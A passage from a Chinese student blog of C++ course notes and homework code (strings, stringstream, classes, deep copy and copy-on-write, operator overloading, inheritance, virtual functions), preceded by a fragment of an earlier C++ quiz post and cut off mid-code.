Answer: B 多态 # 对多态说法正确的是: A.采用静态绑定方式调用普通成员函数 B.通过指针（或引用）调用普通成员函数，仅仅与指针（或引用）的类型有关 C.使用虚成员函数可以在调用函数时使用动态绑定方式 D.当使用指针（或引用）调用虚函数时，实际调用哪个函数依赖于运行时指针所指向的对象的类型 Standard Answer: A, B, C, D 类模板 # 类模板实例化则为模板类\n","date":"June 30, 2023","permalink":"/posts/c++/homework/c++%E7%90%86%E8%AE%BA3/","section":"Posts","summary":"explicit # 当一个类的构造函数有多个参数，除第一个参数外其它都有默认","title":"C++理论3"},{"content":" 1.基础知识(🐶都不看好吧) # 忙里偷闲整理一下上学期学的c++相关知识，希望以后的自己不会回来复习[doge]\n其实是学pwn学累了😇想划一下水（)\n以下的内容真的是基础中的基础，路过的大佬们就不要浪费时间看了 orz，赶紧划到下一篇： 2023 ciscn 初赛 · ta0lve 🙏）\n1.1 引用 # void use_value(int a, int b) { int temp = 0 ; temp = a; a = b; b = temp; } void use_pointer(int* a, int* b) { int temp=0; temp = *a; *a = *b; *b = temp; } void use_reference(int\u0026amp; a, int\u0026amp; b) { int temp = a; a = b ; b = temp ; } 1.1.1 引用的返回值 # #include \u0026lt;iostream\u0026gt; using namespace std; class Number { private: int val; public: Number(int n) : val(n) {} Number\u0026amp; add(int n) { val += n; return *this; } Number\u0026amp; sub(int n) { val -= n; return *this; } //返回值为Number\u0026amp;，返回了对象本身的引用，所以可以在后续调用中链式使用，n.add(2).sub(3).add(4) =\u0026gt; val+2-3+4 //如果返回值为Number，返回的是一个新的Number对象，而不是当前对象的引用，因此需要用临时对象来保存返回的结果，原来的val值并没有改变，而是创建了一个新的Number对象 }; 1.2 二维数组的动态分配 # 1.2.1 方式一 # int x,y; int *arr[x]; for(int i=0;i\u0026lt;x;i++) { arr[i] = new int [y]; } for(int i=0;i\u0026lt;x;i++) { delete [] arr[i]; } 1.2.2 方式二 # int x,y; int **arr = new int *[x]; for(int i=0;i\u0026lt;x;i++) { arr[i] = new int [y]; } for(int i=0;i\u0026lt;x;i++) { delete [] arr[i]; } delete arr; 1.3 输入与输出 # 1.3.1 控制输出的格式 # 英文相关：\n1.iomanip\n2.setprecision()\n3.setw()\n4.scientific\n5.setfill(\u0026rsquo;*')\n#include\u0026lt;iomanip\u0026gt; //记得引入头文件！！！ control the format of numeric value, 123456789.987654321 //格式 Default:1.23457e+08 //直接输出浮点数 Using fixed:123456789.987654 //fixed会视浮点数的整数位与小数位来是否采用科学记数法 With precision 7:123456789.9876543 // setprecision(7) 精度（小数位）函数 Scientific with precision 3:1.235e+08 //setprecision(3) \u0026lt;\u0026lt; scientific -------------------------- //科学计数法,小数位为3 control the base of numeric value, 16 //位置 Hex:10 //cout \u0026lt;\u0026lt; \u0026#34;Hex:\u0026#34; \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; Oct:20 //cout \u0026lt;\u0026lt; \u0026#34;Oct:\u0026#34; \u0026lt;\u0026lt; oct \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; Dec:16 //cout \u0026lt;\u0026lt; \u0026#34;Dec:\u0026#34; \u0026lt;\u0026lt; dec \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; ------------------------------------------------- control the width and alignment, and the width is 6 spaces right aligned 1 2 4 8 //cout \u0026lt;\u0026lt; setw(6) \u0026lt;\u0026lt; num; 16 32 64 128 //if (i % 4 == 0) { 256 512 1024 2048 // cout \u0026lt;\u0026lt; endl;} 4096 8192 16384 32768 //默认右对齐 left aligned 1 2 4 8 //cout \u0026lt;\u0026lt; left \u0026lt;\u0026lt; setw(6) \u0026lt;\u0026lt; num; 16 32 64 128 //左偏移 256 512 1024 2048 4096 8192 16384 32768 --------------------------------------------- control the fillment of 123456 Original: 123456 //cout \u0026lt;\u0026lt; right \u0026lt;\u0026lt; setw(9) \u0026lt;\u0026lt; \u0026#34;Original:\u0026#34; \u0026lt;\u0026lt; setw(8) Filled:**123456 //cout \u0026lt;\u0026lt; right \u0026lt;\u0026lt; setw(9) \u0026lt;\u0026lt; \u0026#34;Filled:\u0026#34; \u0026lt;\u0026lt; setfill(\u0026#39;*\u0026#39;) \u0026lt;\u0026lt; setw(8) */ 1.3.2 从命令行读取若干个元素（数量不定） # /*实际上cin是一个对象，无返回值，而这个返回值是std中重载\u0026gt;\u0026gt;这个运算符返回的，其类型是一个istream\u0026amp;*/ /*istream作为ios继承的一个类型，其中重载了bool这个操作符别名,使得istream其对象可以调用bool操作符（相当于加了一个本类型与bool类型的转换函数），该函数选择性的返回给条件判断语句true或者false，比如istream的对象 如果收到EOF(ctrl+z)就会return false，这也说明了while(cin\u0026gt;\u0026gt;n)当传入EOF能停下来的原因*/ while(std::cin\u0026gt;\u0026gt;x) { sum += x; size++; } while ((cin\u0026gt;\u0026gt;n).bool()) //其实原理是发生了bool类型转换 /*scanf是一个函数，它的返回值是一个int，该int代表scanf成功读取到数据的个数，没有数据即为0，如果读到文件末尾或者输入ctrl+z标志读取完毕的时候就会读到EOF，这时它会返回-1;*/ while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;x)\u0026gt;0) // 大于0可以，等于0会运行崩溃 { sum += x; size++; } while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;x)!=-1) // 不是EOF，不等于-1也可以 { sum += x; size++; } while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;x)) // 返回的是-1，会发生类型转换变成true,会运行崩溃 { sum += x; size++; } 1.4 依次输出A mod B、A÷B # #include\u0026lt;iostream\u0026gt; using namespace std; int main() { int a,b; cin \u0026gt;\u0026gt; a ; cin \u0026gt;\u0026gt; b ; //记得判断是否为零 if(b==0) cout \u0026lt;\u0026lt; \u0026#34;0\\n\u0026#34; \u0026lt;\u0026lt;\u0026#34;0\\n\u0026#34;; else { //float c; float c = (float)a / (float)b; //两处（float）选择一处即可 cout \u0026lt;\u0026lt; a % b \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; c \u0026lt;\u0026lt; endl ; } return 0; } 1.5 字符串操作 # 1.5.1 相关知识 # #include\u0026lt;string\u0026gt; //头文件 std::string s; //using namespace std; cin \u0026gt;\u0026gt; s; //一个单词，不能读入空格，以空格，制表符，回车符作为结束标志 getline(cin,s); //一整句英文，可以读入空格和制表符，以回车符作为结束的标志 string s (6, \u0026#39;a\u0026#39;);//初始化为由 6 个\u0026#39;a\u0026#39;字符组成的字符串 //迭代器定义（与其他迭代器不同）： string::iterator it= s.begin(); for(auto itr : s)//采用auto实现迭代器 //string的基本操作 length（）/size（）;//返回string的长度，即存放的字符数。 int len = s.size(); int len = s.length(); //这两种方式是等价的 //可以用+号和append()函数在函数的末尾添加字符 s += \u0026#39;a\u0026#39;; s.append(\u0026#34;a\u0026#34;);//append只能是字符串\u0026#34;a\u0026#34;,不能是\u0026#39;a\u0026#39; erase(pos) //删除从 pos 到字符串结束处的所有字符 erase(pos, n) //删除从pos开始的n个字符 erase(first,last) //删除区间[first,last)内的所有元素 insert（pos,string）;//在pos号位置插入字符串string insert（it,it2,it3）;//it为原字符串的欲插入位置，it2和it3为待插字符串的首尾迭代器 string str = \u0026#34;abcxyz\u0026#34;,str2 = \u0026#34;opq\u0026#34;; str.insert(str.begin()+3,str2.begin(),str2.end()); substr(pos,len);//提取字符串，返回从pos号位开始，长度为len的字串 str.find(str2);//当str2是str的字串时，返回其在str中第一次出现的位置，如果不是就返回string::npos。 str.find(str2,pos);//从str的pos号位开始匹配str2，返回值与上相同 str.replace(pos,len,str2);//把str从pos号位开始、长度为len的字串替换为str2. str.replace(it1,it2,str2);//把str的迭代器[it1,it2)范围的字串替换为str2. empty()//检查字符串是否为空 clear()//清空字符串 1.5.1_补充：c 风格的char arr[n] 的字符串操作 # strlen(char const *string) //计算字符串长度 char *strcpy(char *dst , char const *src);//字符串复制 char *strncpy(char *dst , char const *src , size_t len) /* 1）如果 strlen(src) \u0026gt; len，则只有 len 个字符被复制到 dst 中去，此时 dst 将不会以 NUL 字节结尾（也就是说，strncpy 调用的结果可能不是一个字符串）； 2）如果 strlen(src) \u0026lt; len，则 src 中的字符全被复制到 dst 中去，dst 中剩余的部分用 NUL 填充。 3)如果 len \u0026gt;strlen(dst),仍然会发生数据溢出覆盖引发安全漏洞，可以进行pwn漏洞利用 */ char *strcat(char *dst,char const *src);//连接两个字符串 int strcmp(char const *s1 , char sonst *s2);//比较两个字符串 int *strncmp(char const *s1 , char const *s2 , size_t len); /*可以使用 strncmp 函数限定比较的字符的个数， 返回值与 strcmp 一样，但是只针对前 len 个字符进行比较。*/ char *strchr(char const *str,int ch);　// int ch 是字符的ASCII码值 char *strrchr(char const *str,int ch); /*函数 strchr 在字符串 str 中查找字符 ch 第一次出现的位置，并返回一个指向该位置的指针；如果没有找到相应的字符，则返回一个 NULL 指针。 函数 strrchr 在字符串中查找字符 ch 最后一次出现的位置，并返回指向该位置的指针。*/ char *strpbrk(char const *str , char const *group); /*查找任何一组字符第一次在字符串中出现的位置,返回一个指向字符串 str 中第一个匹配 group 中任何一个字符的字符位置，(只要出现其中任意一个都可以！！)如果没有匹配到，则返回一个 NULL 指针。*/ char *strstr(char const *str1 , char const *str2); /*这个函数在 str1 中查找整个字符串 str2 第一次出现的起始位置，并返回一个指向该位置的指针；如果 str2 并没有完整的出现在 str1 中，则函数将返回一个 NULL 指针；如果 str2 是一个空字符串，则返回str1.*/ 1.5.2 对字符串中的字符操作 # //1.auto c:s for(auto c:s) { if(c \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;=\u0026#39;z\u0026#39;) } //2.s[i] for(int i=0;i\u0026lt;s.length(); i++) { if(s[i] \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;=\u0026#39;z\u0026#39;) } //若为c风格的char arr[n]字符串，则用strlen()函数 for(int i=0;i\u0026lt;strlen(arr); i++) { if(arr[i] \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;=\u0026#39;z\u0026#39;) } 1.5.3 stringstream学习（非课堂知识） # 1.使用方法\n//使用stringstream需要引入\u0026lt;sstream\u0026gt;头文件 stringstream//对象(ss)常使用的两个方法 ss.clear()//清除流的状态标志，但不会改变流中的内容。 ss.str(\u0026#34;\u0026#34;)//清空流中的数据，相当于无论之前流中的数据是什么，使用str(\u0026#34;\u0026#34;)之后，流数据为空，并且将状态符固定。 ss.str() //返回stringsteam中管理的全部string内容 /*注意: 对同一个stringstream对象重复赋值时，就需要先对流使用clear()函数清空流的状态，此时流占用的内存没有改变，会一直增加(stringstream不主动释放内存)，若想改变内存(一般是清除内存，减少内存消耗)，需要再配合使用str(\u0026#34;\u0026#34;)清空stringstream的缓存 */ //数字 -\u0026gt; stringstream对象 -\u0026gt; string //不需要用tostring()这些内置函数 //（此方法具有普遍适用性） int main() { stringstream ss; string str; int num= 1000; // 将int类型的值放入输入流中 ss \u0026lt;\u0026lt; num; // 从sstream中抽取前面插入的int类型的值，赋给string类型 ss \u0026gt;\u0026gt; str; //使用stringstream来做转换时，最好使用完，进行ss.clear()操作 ss.clear(); return 0; } //string -\u0026gt; stringstream对象 -\u0026gt; 数字 #include \u0026lt;iostream\u0026gt; #include \u0026lt;sstream\u0026gt; using namespace std; int main() { double dVal; int iVal; string str; stringstream ss; // string -\u0026gt; double str = \u0026#34;123.456789\u0026#34;; ss \u0026lt;\u0026lt; str; ss \u0026gt;\u0026gt; dVal; cout \u0026lt;\u0026lt; \u0026#34;dVal: \u0026#34; \u0026lt;\u0026lt; dVal \u0026lt;\u0026lt; endl; // string -\u0026gt; int str = \u0026#34;654321\u0026#34;; ss.clear(); //注意 stringstream 要clear!!! ss \u0026lt;\u0026lt; str; ss \u0026gt;\u0026gt; iVal; cout \u0026lt;\u0026lt; \u0026#34;iVal: \u0026#34; \u0026lt;\u0026lt; iVal \u0026lt;\u0026lt; endl; return 0; } stringstream 中还能存放多个字符串，可以实现多个字符串拼接的目的\nint main() { stringstream sstream; // 将多个字符串放入 sstream 中 sstream \u0026lt;\u0026lt; \u0026#34;first\u0026#34; \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; \u0026#34;string,\u0026#34;; sstream \u0026lt;\u0026lt; \u0026#34; second string\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;strResult is: \u0026#34; \u0026lt;\u0026lt; sstream.str() \u0026lt;\u0026lt; endl; // 清空 sstream sstream.str(\u0026#34;\u0026#34;); sstream \u0026lt;\u0026lt; \u0026#34;third string\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;After clear, strResult is: \u0026#34; \u0026lt;\u0026lt; sstream.str() \u0026lt;\u0026lt; endl; return 0; } （1）可以使用 str() 方法，将 stringstream 类型转换为 string 类型； （2）可以将多个字符串放入 stringstream 中，实现字符串的拼接目的； （3）如果想清空 stringstream，必须使用 sstream.str(\u0026quot;\u0026quot;); 方式；\n（4）clear() 方法适用于进行多次数据类型转换的场景，栗子如下\n#include \u0026lt;sstream\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; int main() { stringstream sstream; int first, second; // 插入字符串 sstream \u0026lt;\u0026lt; \u0026#34;456\u0026#34;; // 转换为int类型 sstream \u0026gt;\u0026gt; first; cout \u0026lt;\u0026lt; first \u0026lt;\u0026lt; endl; // 在进行多次类型转换前，必须先运行clear() sstream.clear(); // 插入bool值 sstream \u0026lt;\u0026lt; true; // 转换为int类型 sstream \u0026gt;\u0026gt; second; cout \u0026lt;\u0026lt; second \u0026lt;\u0026lt; endl; return 0; } 数字与字符串互转\n//数字转字符串： //1.to_string()函数，其他类型数字也可以，此处不列举 std::to_string(int) //2.使用std::stringstream for(int i = 0; i \u0026lt; 5; i++) { std::stringstream ss; std::string str; ss \u0026lt;\u0026lt; i; ss \u0026gt;\u0026gt; str; std::cout \u0026lt;\u0026lt; str.data() \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } //字符串转数字,头文件：cstdlib #include\u0026lt;cstdlib\u0026gt; std::stoi() //int std::stol() //long std::stoll() //long long std::stoull() //u long long std::stod() //double std::stold() for(int i = 0; i \u0026lt; 5; i++) { std::stringstream ss; std::string strNum = std::to_string(i); int num; ss \u0026lt;\u0026lt; strNum; ss \u0026gt;\u0026gt; num; std::cout \u0026lt;\u0026lt; num * num \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } 其他的stringtream\n//其他的stringtream(随缘记，随缘使用) //ostringstream对象用来进行格式化的输出，常用于将各种类型转换为string类型 //ostringstream只支持\u0026lt;\u0026lt;操作符 #include \u0026lt;sstream\u0026gt; template\u0026lt;typename T\u0026gt; string toString(const T\u0026amp; t) { ostringstream oss; //创建一个格式化输出流 oss\u0026lt;\u0026lt;t; //把值传递如流中 return oss.str(); } template \u0026lt;class Type\u0026gt; Type stringToNum(const string\u0026amp; str) { istringstream iss(str); //转成 Type num; iss \u0026gt;\u0026gt; num; return num; } 1.5.4 相关应用 # 其实是部分作业（）\n//左旋转操作 //输入字符串\u0026#34;abcdefg\u0026#34;和数字2，该函数将返回左旋转两位得到的结果\u0026#34;cdefgab\u0026#34; #include\u0026lt;iostream\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; int main() { string s; int n; cin \u0026gt;\u0026gt; s; cin \u0026gt;\u0026gt; n; string pre = s; s.erase(0,n); pre.erase(n,(pre.length())); s += pre; cout \u0026lt;\u0026lt; s \u0026lt;\u0026lt; endl; return 0; } //首字母大写 #include\u0026lt;iostream\u0026gt; #include\u0026lt;string\u0026gt; using namespace std; int main() { string pre; int flag=0; getline(cin,pre) ; for(auto\u0026amp; c: pre) { if(c \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;=\u0026#39;z\u0026#39;\u0026amp;\u0026amp;flag==0) { c = c-\u0026#39;a\u0026#39;+\u0026#39;A\u0026#39;; flag=1; } else if(c == \u0026#39; \u0026#39;) flag =0; } cout \u0026lt;\u0026lt; pre \u0026lt;\u0026lt; endl ; return 0; } 1.6 类的真的很基础的基础知识 # 其实就是一些简单的成员函数的实现，此处随便ctrl+c、ctrl+v意思一下（）\n1.6.1 完善Rectangle类 # //类中声明: static int count; //类外初始化定义： int Rectangle::cout = 0; class Rectangle { private: double width, height; public: Rectangle(double w = 1, double h = 1) : width(w), height(h) {} double getWidth() const; double getHeight() const; void setWidth(double width); void setHeight(double height); double getArea() const; double getPerimeter() const; }; double Rectangle::getWidth() const { return width; } double Rectangle::getHeight() const { return height; } void Rectangle::setWidth(double width) { this-\u0026gt;width=width; } void Rectangle::setHeight(double height) { this-\u0026gt;height=height; } double Rectangle::getArea() const { return width*height; } double Rectangle::getPerimeter() const { return width+width+height+height; } 1.6.2 完善stack类 # #ifndef STACK_HPP #define STACK_HPP #include \u0026lt;iostream\u0026gt; class Stack { private: struct node { int num; node* next; node() { num = 0; next = NULL; } node(int n, node* p = NULL) { num = n; next = p; } };\tnode* data; public: Stack();// 构造一个空栈 ~Stack();// 注意内存回收 void push(int);// 入栈 void pop();// 出栈 int top() const;// 查看栈顶元素，若栈为空，返回0 bool empty() const;// 判断栈是否为空 void clear();// 清空栈 }; #endif #include \u0026lt;iostream\u0026gt; #include \u0026#34;Stack.h\u0026#34; using namespace std; Stack::Stack() { data = NULL; } Stack::~Stack() { clear(); } void Stack::push(int n) { node* p = new node(n, data); data = p; } void Stack::pop() { if (empty()) return; node* p = data; data = data-\u0026gt;next; delete p; } int Stack::top() const { if (empty()) return 0; return data-\u0026gt;num; } bool Stack::empty() const { return data == NULL; } void Stack::clear() { while (!empty()) { pop(); } } 1.6.3 反转链表 # #include \u0026lt;iostream\u0026gt; using namespace std; class ListNode{ public: int val; ListNode *next; ListNode(int x) : val(x), next(NULL) {} }; ListNode* reverseList(ListNode* head) { ListNode* prev = nullptr; // 前驱节点指针 ListNode* curr = head; // 当前节点指针 while (curr != nullptr) { ListNode* next = curr-\u0026gt;next; // 后继节点指针 curr-\u0026gt;next = prev; // 反转箭头指向前驱节点 prev = curr; // 更新前驱节点指针 curr = next; // 更新当前节点指针 } return prev; // 返回反转后的头节点 } int main() { // 构建一个链表，输入为 1 2 3 4 5 ListNode* head = new ListNode(1); ListNode* curr = head; for (int i = 2; i \u0026lt;= 5; i++) { curr-\u0026gt;next = new ListNode(i); curr = curr-\u0026gt;next; } // 调用反转链表函数 head = reverseList(head); // 输出反转后链表的值 curr = head; while (curr != nullptr) { std::cout \u0026lt;\u0026lt; curr-\u0026gt;val \u0026lt;\u0026lt; \u0026#34; \u0026#34;; curr = curr-\u0026gt;next; } // 释放链表内存 curr = head; while (curr != nullptr) { ListNode* temp = curr; curr = curr-\u0026gt;next; delete temp; } return 0; } 1.6.4 构造函数列表初始化 # class base_class { private: int a; public: base_class(int a) {this-\u0026gt;a = a;} void print() {std::cout \u0026lt;\u0026lt; a \u0026lt;\u0026lt; std::endl;} }; class my_class { private: base_class base; //类成员变量 public: my_class(const int a); void print() {base.print();} }; my_class::my_class(const int a):base(a){} //类成员变量采用列表初始化的方式赋初值，之后的继承同理 1.6.5 构造函数参数有默认参数值 # //在C++中，默认参数只能在函数声明或者定义的一个地方提供， //不能同时在函数声明和定义都提供默认参数。 //提供默认参数可以使该构造函数涵盖无参数，一个参数，两个参数的构造函数调用场景 class COMPLEX { public: COMPLEX(double r = 0, double i = 0); private: double real; double image; }; // 构造函数的定义 COMPLEX::COMPLEX(double r, double i) { real = r; image = i; } 1.7类的基础知识 # 1.7.1 深拷贝 # 在进行深拷贝时，需要注意以下两点：\n检查目标对象中的数据成员是否已经分配内存（是否不等于nullptr），如果是，则需要先释放（delete），防止内存泄漏 创建新的内存空间，并将原始数据拷贝到新空间中，确保每个对象拥有独立的内存副本 //一维数组深拷贝 class array { private: int size; // size int *data; // dynamically allocate/release memory public: array()； array(int size, int val); array(const array \u0026amp;another) { data = nullptr; //执行构造函数是还未分配内存空间，所以不用delete deep_copy(another); } ~array(); void deep_copy(const array \u0026amp;another); }; array::array() { size = 0; data = nullptr; } array::array(int size, int val) { this-\u0026gt;size=size; this-\u0026gt;data=NULL; data=new int[size]; for(int i=0;i\u0026lt;size;i++) { data[i]=val; } } array::~array() { delete [] data; } void array::deep_copy(const array \u0026amp;another) { this-\u0026gt;size=another.size; //检查data是否为nullptr if(data!=nullptr) { delete [] data; } //指向新创建的内存空间 data=new int[this-\u0026gt;size]; //完成深拷贝 for(int i=0;i\u0026lt;size;i++) { data[i]=another.data[i]; } } //重载赋值运算符时也要记得先释放空间 void Cat::_copy(const Cat \u0026amp; cat) { size = cat.size; name = cat.name; family = new Cat*[size]; for (int i = 0; i \u0026lt; size; ++ i) family[i] = cat.family[i]; } Cat::Cat(const Cat \u0026amp; cat) { _copy(cat); } Cat\u0026amp; Cat::operator=(const Cat \u0026amp; cat) { delete [] family;//可以不检查 _copy(cat); return *this; } //二维数组深拷贝 class array2d { private: int row; int col; array *data; public: array2d(int row, int col, int val); array2d(const array2d \u0026amp;another) { data = nullptr; deep_copy(another); } ~array2d(); void deep_copy(const array2d \u0026amp;another); }; array2d::array2d(int row, int col, int val) { this-\u0026gt;row = row; this-\u0026gt;col = col; data = new array[row]; for (int i = 0; i \u0026lt; row; ++i) { data[i].deep_copy(array(col, val)); //采用深拷贝的方法来赋初值 } } array2d::~array2d() { delete[] data; } void array2d::deep_copy(const array2d \u0026amp;another) { if (data != nullptr) delete[] data; row = another.row; col = another.col; data = new array[row]; for (int i = 0; i \u0026lt; row; ++i) { data[i].deep_copy(another.data[i]); //深拷贝 } } 1.7.2 写时拷贝 # (以一维数组为例)\n观察一维数组类的deep_copy函数的实现，我们发现，在每次进行深拷贝的时候，我们都需要重新分配一块新的内存。在很多时候，array的实例可能只需要调用print函数（不改变值的打印函数），不需要调用assign函数（改变值的赋值函数），即实例不会对data指向的内存进行修改。对于这些实例，data指向的内存所存放的内容是相同的，因此可以共享，不需要重新分配内存，从而达到减少内存开销的目的。但是，我们并不能提前预知每一个实例在使用过程中是否会对data指向的内存进行修改，不难想到，只需要将深拷贝的过程延迟到实例第一次发生修改的地方即可，这就是写时复制，copy on write。\n写时复制的具体实现：\n成员变量ref_counter的作用是标记当前引用data指向的内存的实例数量。 在非复制构造函数中，ref_counter指向的整型变量初始化为1。 当调用deep_copy函数时，并不会执行深拷贝，而是执行浅拷贝，然后对ref_counter进行加1。 copy_on_write是真正执行深拷贝的函数。 当需要释放data和ref_counter指向的内存时，如果ref_counter指向的值为1，则释放；否则，对ref_counter指向的值减1，不进行释放操作。 class array { private: int size; // size int *data; // dynamically allocate/release memory int *ref_counter; // reference counter void copy_on_write(); // copy on write public: array(); array(int size, int val); array(const array \u0026amp;another) { data = nullptr; ref_counter = nullptr; deep_copy(another); } ~array(); bool assign(int pos, int val); void deep_copy(const array \u0026amp;another); void print() const { for (int i = 0; i \u0026lt; size; ++i) std::cout \u0026lt;\u0026lt; data[i] \u0026lt;\u0026lt; std::endl; } int get_ref_counter() { return *ref_counter; } int *get_data() { return data; } }; #include\u0026lt;iostream\u0026gt; #include \u0026#34;array.h\u0026#34; array::array() { size = 0; data = nullptr; ref_counter=new int; *ref_counter=1; } array::array(int size, int val) { this-\u0026gt;size = size; ref_counter=new int; *ref_counter=1; data = new int[size]; for (int i = 0; i \u0026lt; size; ++i) data[i] = val; } array::~array() { if((*ref_counter)==1) { delete ref_counter; delete[] data; } else (*ref_counter)--; } // 如果pos不越界，则将pos位置的元素赋值为val，返回true；如果pos越界，则返回false bool array::assign(int pos, int val) { if (*ref_counter != 1) { (* ref_counter)--; copy_on_write(); } bool result = true; //标记是否成功 if (pos \u0026gt;= 0 \u0026amp;\u0026amp; pos \u0026lt; this-\u0026gt;size) { this-\u0026gt;data[pos] = val;//在深拷贝后的新内存空间中改变data } else { result = false; } return result; } //假的深拷贝函数 void array::deep_copy(const array\u0026amp; another) { if (\u0026amp;another != this) { size = another.size; if (ref_counter != nullptr\u0026amp;\u0026amp; *ref_counter==1) { delete[] data; delete ref_counter; } else if (ref_counter != nullptr \u0026amp;\u0026amp; *ref_counter != 1) { (*ref_counter)--; } ref_counter = another.ref_counter; (*ref_counter)++; data = another.data; } } //真正的深拷贝函数——写时拷贝函数 void array::copy_on_write() { ref_counter = new int; *ref_counter = 1; int* temp = data; //指向原本的data内存空间 data = new int[size]; //创建一个新的内存空间（深拷贝） for (int i = 0; i \u0026lt; size; i++) { data[i] = temp[i]; //完成深拷贝 } } 1.7.3 重载的基础应用 # //重载前置++，改变值的大小，并返回改变后的值 COMPLEX \u0026amp;COMPLEX::operator++() { real += 1; image += 1; return *this; } //重载后置++，改变值的大小，但是返回改变前的值 COMPLEX COMPLEX::operator++(int) { COMPLEX temp(this-\u0026gt;real,this-\u0026gt;image); this-\u0026gt;real++; this-\u0026gt;image++; return temp; } //函数对象，重载操作符（），使得能够像调用函数一样使用对象 class Exchange{ public: void operator()(int\u0026amp;, int\u0026amp;); }; void Exchange::operator()(int\u0026amp; x, int\u0026amp; y) { int temp=x; x=y; y=temp; } 流运算符重载（友元函数）\nfriend ostream \u0026amp; operator \u0026lt;\u0026lt; (ostream \u0026amp;os, const BigInt \u0026amp;object) { os\u0026lt;\u0026lt;object.num; return os; } friend ostream \u0026amp; operator \u0026lt;\u0026lt; (ostream \u0026amp;os, const OperatorLinkedQueue \u0026amp;object); ostream \u0026amp; operator \u0026lt;\u0026lt; (ostream \u0026amp;os, const OperatorLinkedQueue \u0026amp;object){ for(int i = 0;i\u0026lt;object.size;i++){ os\u0026lt;\u0026lt;object[i]; if(i!=object.size-1) cout\u0026lt;\u0026lt;\u0026#34;-\u0026gt;\u0026#34;; } return os; } 1.7.4 对类成员使用动态内存分配 # //在类中声明： Date* birthDate; //类外完成构造函数的定义： Student::Student(int id, int year, int month, int day) { this-\u0026gt;id = id; birthDate = new Date(year,month,day); numberOfObjects++; } //类外完成析构函数的定义： Student::~Student() { numberOfObjects--; delete birthDate; } 1.7.5 static成员变量与函数的定义 # //类内声明（但变量不初始化） static int numberOfObjects; static int getNumberOfObjects(); //类外完成定义（都不需要加 static 关键字！！！） int Student::numberOfObjects = 0; int Student::getNumberOfObjects() { return numberOfObjects; } 1.8 继承的基础知识 # 1.8.派生类的构造函数 # class A { public: A(int a0):a(a0) {} void showA() { cout\u0026lt;\u0026lt;a\u0026lt;\u0026lt;endl; } protected: int a; }; class C { public: C(int c0):c(c0) {} void showC() { cout\u0026lt;\u0026lt;c\u0026lt;\u0026lt;endl; } protected: int c; }; /*您需要从a和C派生类B。B类只有一个构造函数，它有两个int类型的参数，第一个用于a，第二个用于C。这两个参数的默认值分别为11和22。*/ class B : public A , public C { public: int a; int c; B(int a=11,int b=22):A(a),C(b){} //类内声明为B(int,int) //类外再完成函数定义：B::B(int a=11,int b=22):A(a),C(b){} //可以涵盖无参数，一个参数，两个参数时的构造函数调用场景 //先调用A的构造函数，再调用C的构造函数，最后调用B的构造函数 //析构函数反之 }; 1.8.2 虚类继承 # class Weekend:virtual public Writing,virtual public Racing { //略 }; class Workday:public virtual Racing,public virtual Writing { //略，virtual关键词顺序不重要 } class Choseday:public Weekend,public Workday { //只会调用一次 Writing类和Racing类的构造函数 } 1.9 虚函数 # virtual double GetArea() const = 0; //（1）=0说明它是纯虚函数 //（2）const表明不能修改其数据成员 //（3）const=0 二者都在 参数(void) 的后面！ //在派生类中重载该虚函数记得后面也要加上 const（因为是纯虚函数，不加后面调用会报错） //一个类的同名同参数函数 后面加不加const都存在时，只有在 const类中才会调用到const函数 //一个类的同名同参数函数 前面加不加const都存在时，会报错，因为返回值不同，所以会有调用分歧 1.9.1 虚析构函数 # 我们知道，为了能够正确的调用对象的析构函数，一般要求具有层次结构的顶级类定义其析构函数为虚函数。因为在delete一个抽象类指针时候，必须要通过虚函数找到真正的析构函数。\n如：\nclass Base { public: Base(){} virtual ~Base(){} }; class Derived: public Base { public: Derived(){}; ~Derived(){}; } void foo() { Base *pb; pb = new Derived; delete pb; } 这是正确的用法，会发生动态绑定，它会先调用Derived的析构函数，然后是Base的析构函数\n如果析构函数不加virtual，delete pb只会执行Base的析构函数，而不是真正的Derived析构函数。\n因为不是virtual函数，所以调用的函数依赖于指向静态类型，即Base。\n参考链接： 析构函数可以是纯虚函数吗?\n最后，总结一下关于虚函数的一些常见问题：\n虚函数是动态绑定的，也就是说，使用虚函数的指针和引用能够正确找到实际类的对应函数，而不是执行定义类的函数。这是虚函数的基本功能，就不再解释了。 构造函数不能是虚函数。而且，在构造函数中调用虚函数，实际执行的是父类的对应函数，因为自己还没有构造好, 多态是被disable的。 析构函数可以是虚函数，而且，在一个复杂类结构中，这往往是必须的。 将一个函数定义为纯虚函数，实际上是将这个类定义为抽象类，不能实例化对象。 纯虚函数通常没有定义体，但也完全可以拥有, 甚至可以显示调用。 析构函数可以是纯虚的，但纯虚析构函数必须有定义体，*因为析构函数的调用是在子类中隐含的*。 非纯的虚函数必须有定义体，不然是一个错误。 派生类的override虚函数定义必须和父类完全一致(c++11中使用override进行编译器检查)。除了一个特例，如果父类中返回值是一个指针或引用，子类override时可以返回这个指针（或引用）的派生。例如，在上面的例子中，在Base中定义了virtual Base* clone(); 在Derived中可以定义为 virtual Derived* clone()。可以看到，这种放松对于Clone模式是非常有用的(也就是说override并不会检查返回值类型)。 1.10 模板 # 1.10.1 类模板 # /*栈 Stack 是一种先入后出的数据结构，最先入栈的元素称为栈底，最后入栈的元素称为栈顶。为了方便，可用 node.hpp 中的链表结构实现栈，并用链表头指向栈顶元素。 请实现一个类模板 Stack ，使其可以保存不同类型的数据。*/ #include \u0026#34;genericStack.hpp\u0026#34; #include \u0026lt;iostream\u0026gt; using namespace std; int main() //程序EX6_4.cpp { 